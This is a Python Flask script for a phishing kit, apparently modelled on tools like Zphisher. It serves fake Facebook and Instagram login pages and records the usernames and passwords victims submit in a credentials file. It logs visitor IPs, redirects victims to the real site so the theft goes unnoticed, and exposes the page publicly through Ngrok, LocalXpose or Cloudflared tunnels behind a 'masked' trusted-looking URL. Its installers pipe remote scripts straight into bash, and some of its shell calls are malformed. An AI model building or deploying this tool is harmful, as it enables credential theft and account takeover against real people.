import os
import subprocess
import time
import sys
from datetime import datetime
from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

# ASCII Banner
def show_banner():
    print("""
     ██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
     ██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
     ██║██████╔╝███████║██║███████╗███████║
██   ██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
╚█████╔╝██║     ██║  ██║██║███████║██║  ██║
 ╚════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
    """)

# Log credentials and sessions
def log_credentials(username, password, service):
    with open('credentials.txt', 'a') as f:
        f.write(f"[{datetime.now()}] Service: {service}, Username: {username}, Password: {password}\n")

def log_session(ip, service):
    with open('sessions.log', 'a') as f:
        f.write(f"[{datetime.now()}] IP: {ip}, Visited: {service}\n")

# Phishing routes
@app.route('/')
def home():
    return render_template('login.html')

@app.route('/facebook', methods=['GET', 'POST'])
def facebook():
    if request.method == 'POST':
        username = request.form.get('email')
        password = request.form.get('pass')
        log_credentials(username, password, 'Facebook')
        return redirect("https://facebook.com")  # Redirect to real Facebook
    log_session(request.remote_addr, 'Facebook')
    return render_template('facebook.html')

@app.route('/instagram', methods=['GET', 'POST'])
def instagram():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        log_credentials(username, password, 'Instagram')
        return redirect("https://instagram.com")  # Redirect to real Instagram
    log_session(request.remote_addr, 'Instagram')
    return render_template('instagram.html')

# Check if a tool is installed
def is_tool_installed(tool_name):
    try:
        if os.name == 'nt':  # Windows
            subprocess.check_output(["where", tool_name], shell=True)
        else:  # Linux/macOS
            subprocess.check_output(["which", tool_name])
        return True
    except subprocess.CalledProcessError:
        return False

# Install Ngrok (Linux/macOS)
def install_ngrok():
    try:
        print("\n[+] Installing Ngrok...")
        if os.name == 'nt':
            print("\n[!] Please download Ngrok for Windows from: https://ngrok.com/download")
            return False
        else:
            subprocess.run(["curl", "-s", "https://ngrok-agent.s3.amazonaws.com/ngrok.asc", "|", "sudo", "tee", "/etc/apt/trusted.gpg.d/ngrok.asc", ">/dev/null"], shell=True)
            subprocess.run(["echo", "\"deb https://ngrok-agent.s3.amazonaws.com buster main\"", "|", "sudo", "tee", "/etc/apt/sources.list.d/ngrok.list"], shell=True)
            subprocess.run(["sudo", "apt", "update"])
            subprocess.run(["sudo", "apt", "install", "ngrok"])
            return True
    except Exception as e:
        print(f"\n[!] Failed to install Ngrok: {e}")
        return False

# Install LocalXpose (Linux/macOS)
def install_localxpose():
    try:
        print("\n[+] Installing LocalXpose...")
        if os.name == 'nt':
            print("\n[!] Please download LocalXpose for Windows from: https://localxpose.io/download")
            return False
        else:
            subprocess.run(["curl", "-s", "https://localxpose.io/download.sh", "|", "bash"], shell=True)
            return True
    except Exception as e:
        print(f"\n[!] Failed to install LocalXpose: {e}")
        return False

# Install Cloudflared (Linux/macOS)
def install_cloudflared():
    try:
        print("\n[+] Installing Cloudflared...")
        if os.name == 'nt':
            print("\n[!] Please download Cloudflared for Windows from: https://github.com/cloudflare/cloudflared/releases")
            return False
        else:
            subprocess.run(["wget", "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", "-O", "cloudflared"], shell=True)
            subprocess.run(["chmod", "+x", "cloudflared"], shell=True)
            subprocess.run(["sudo", "mv", "cloudflared", "/usr/local/bin/"])
            return True
    except Exception as e:
        print(f"\n[!] Failed to install Cloudflared: {e}")
        return False

# Start Ngrok
def start_ngrok(auth_token, port=8080):
    try:
        if not is_tool_installed("ngrok"):
            if not install_ngrok():
                return False
        subprocess.Popen(["ngrok", "http", str(port), "--authtoken", auth_token, "--log=stdout"])
        time.sleep(5)  # Wait for Ngrok to initialize
        print("\n[+] Ngrok tunnel started successfully!")
        return True
    except Exception as e:
        print(f"\n[!] Failed to start Ngrok: {e}")
        return False

# Start LocalXpose
def start_localxpose(auth_token, domain, port=8080):
    try:
        if not is_tool_installed("localxpose"):
            if not install_localxpose():
                return False
        subprocess.Popen(["localxpose", "http", str(port), "--to", domain, "--auth", auth_token])
        print("\n[+] LocalXpose tunnel started successfully!")
        return True
    except Exception as e:
        print(f"\n[!] Failed to start LocalXpose: {e}")
        return False

# Start Cloudflared
def start_cloudflared(port=8080):
    try:
        if not is_tool_installed("cloudflared"):
            if not install_cloudflared():
                return False
        subprocess.Popen(["cloudflared", "tunnel", "--url", f"http://localhost:{port}"])
        time.sleep(5)  # Wait for Cloudflared to initialize
        print("\n[+] Cloudflared tunnel started successfully!")
        return True
    except Exception as e:
        print(f"\n[!] Failed to start Cloudflared: {e}")
        return False

# Main setup
def setup():
    show_banner()
    print("\n[+] Select Phishing Page:")
    print("1. Facebook")
    print("2. Instagram")
    choice = input("\nEnter choice (1/2): ").strip()

    print("\n[+] Select Tunnel Service:")
    print("1. Ngrok")
    print("2. LocalXpose")
    print("3. Cloudflared")
    tunnel_choice = input("\nEnter choice (1/2/3): ").strip()

    masked_url = input("\nEnter URL to mask (e.g., https://trusted-site.com): ").strip()

    if tunnel_choice == "1":
        ngrok_token = input("\nNgrok Auth Token: ").strip()
        if not start_ngrok(ngrok_token):
            sys.exit(1)
    elif tunnel_choice == "2":
        localxpose_token = input("\nLocalXpose Auth Token: ").strip()
        if not start_localxpose(localxpose_token, masked_url):
            sys.exit(1)
    elif tunnel_choice == "3":
        if not start_cloudflared():
            sys.exit(1)
    else:
        print("\n[!] Invalid choice. Exiting.")
        sys.exit(1)

    print(f"\n[+] Phishing page active! Masked URL: {masked_url}")

if __name__ == '__main__':
    setup()
    app.run(host='127.0.0.1', port=8080)
